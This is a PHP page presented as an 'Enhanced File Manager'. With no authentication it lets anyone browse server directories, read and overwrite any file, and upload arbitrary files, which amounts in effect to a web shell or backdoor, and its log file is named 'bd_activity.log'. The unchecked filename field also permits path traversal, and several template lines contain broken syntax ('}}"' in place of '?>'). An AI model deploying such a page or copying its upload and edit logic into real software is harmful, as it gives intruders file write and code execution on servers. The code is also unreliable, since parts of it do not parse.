<?php
session_start();

// Secure log directory
$logDir = __DIR__ . '/secure';
if (!is_dir($logDir)) {
    mkdir($logDir, 0755, true);
}

// Log function
function log_activity($message) {
    $log_file = __DIR__ . '/secure/bd_activity.log';
    $log_entry = date('[Y-m-d H:i:s] ') . $message . PHP_EOL;
    file_put_contents($log_file, $log_entry, FILE_APPEND);
}

// Handle directory traversal securely
$baseDir = realpath(__DIR__ . '/../../'); // Allow going back beyond script location
$cwd = isset($_GET['dir']) ? realpath($_GET['dir']) : $baseDir;
if (!$cwd || strpos($cwd, $baseDir) !== 0) {
    $cwd = $baseDir; // Prevent unauthorized access outside base
}

$parent_dir = dirname($cwd);
$message = '';
$file_content = '';
$filename = '';

// Handle file actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $filename = $_POST['filename'] ?? '';
    $action = $_POST['action'] ?? '';
    $file_path = $cwd . DIRECTORY_SEPARATOR . $filename;

    if ($action === 'view' || $action === 'edit') {
        if (file_exists($file_path) && is_file($file_path)) {
            $file_content = htmlspecialchars(file_get_contents($file_path));
            log_activity("User viewed file: $file_path");
        } else {
            $message = "File does not exist.";
        }
    }

    if ($action === 'save' && isset($_POST['content'])) {
        $file_content = $_POST['content'];
        if (file_put_contents($file_path, $file_content)) {
            log_activity("User edited and saved file: $file_path");
            $message = "File saved successfully!";
        } else {
            $message = "Failed to save the file.";
        }
    }
}

// Handle file upload
if (!empty($_FILES['uploaded_file']['name'])) {
    $uploadPath = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['uploaded_file']['name']);
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $uploadPath)) {
        log_activity("File uploaded: $uploadPath");
        $message = "File uploaded successfully!";
    } else {
        $message = "File upload failed.";
    }
}

// Get files & directories list
$items = array_diff(scandir($cwd), ['.', '..']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; background: #181a1b; color: #fff; margin: 0; padding: 20px; }
        h1 { text-align: center; color: #ff7f50; }
        .message { color: #ffae42; text-align: center; margin-bottom: 10px; }
        .directory-nav { text-align: center; }
        .directory-nav a { color: #61dafb; text-decoration: none; }
        .directory-nav a:hover { text-decoration: underline; }
        ul { list-style: none; padding: 0; }
        li { padding: 10px; background: #333; margin: 5px 0; border-radius: 5px; display: flex; justify-content: space-between; }
        .file-actions { display: flex; gap: 10px; }
        button, input[type="submit"] { background: #61dafb; color: #000; padding: 5px 10px; border-radius: 3px; cursor: pointer; }
        button:hover, input[type="submit"]:hover { background: #21a1f1; }
    </style>
    <script>
        function openEditor(content, filename) {
            document.getElementById('editor-modal').style.display = 'block';
            document.getElementById('editor-content').value = content || '';
            document.getElementById('editor-filename').value = filename;
        }
        function closeEditor() { document.getElementById('editor-modal').style.display = 'none'; }
    </script>
</head>
<body>
    <h1>Enhanced File Manager</h1>
    <div class="message"><?= htmlspecialchars($message) ?></div>
    <div class="directory-nav">
        <a href="?dir=<?= urlencode($parent_dir) ?>">⬅ Back</a>
        <p>Current: <?= htmlspecialchars($cwd) ?></p>
    </div>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="uploaded_file" required>
        <input type="submit" value="Upload">
    </form>
    <ul>
        <?php foreach ($items as $item): ?>
            <?php $item_path = $cwd . DIRECTORY_SEPARATOR . $item; ?>
            <li>
                <span><?= htmlspecialchars($item) ?></span>
                <div class="file-actions">
                    <?php if (is_dir($item_path)): ?>
                        <a href="?dir=<?= urlencode($item_path) }}"><button>Open</button></a>
                    <?php else: ?>
                        <button onclick="openEditor('<?= addslashes(htmlspecialchars(file_get_contents($item_path))) ?>', '<?= htmlspecialchars($item) ?>')">Edit</button>
                        <a href="download.php?file=<?= urlencode($item_path) }}"><button>Download</button></a>
                    <?php endif; ?>
                </div>
            </li>
        <?php endforeach; ?>
    </ul>
    <div id="editor-modal" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); background:#1e1e2f; padding:20px; border-radius:8px;">
        <h2>File Editor</h2>
        <form method="POST">
            <textarea id="editor-content" name="content" style="width:100%; height:300px;"> </textarea>
            <input type="hidden" id="editor-filename" name="filename">
            <input type="hidden" name="action" value="save">
            <input type="submit" value="Save">
            <button type="button" onclick="closeEditor()">Cancel</button>
        </form>
    </div>
</body>
</html>
